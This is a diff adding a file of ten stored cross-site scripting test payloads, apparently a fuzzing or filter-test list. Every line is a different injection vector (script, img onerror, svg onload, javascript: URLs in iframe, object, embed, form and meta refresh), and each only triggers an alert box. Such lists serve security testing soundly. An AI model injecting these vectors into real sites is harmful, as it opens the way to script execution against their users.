@@ -1,0 +1,10 @@
+<script>alert('Stored XSS')</script>
+<img src="x" onerror="alert('Stored XSS')">
+<iframe src="javascript:alert('Stored XSS');"></iframe>
+<svg/onload=alert('Stored XSS')>
+<body onload="alert('Stored XSS')">
+<div style="background-image: url(javascript:alert('Stored XSS'));">XSS</div>
+<object data="javascript:alert('Stored XSS')"></object>
+<embed src="javascript:alert('Stored XSS')">
+<form><button formaction="javascript:alert('Stored XSS')">Submit</button></form>
+<meta http-equiv="refresh" content="0; url=javascript:alert('Stored XSS')">
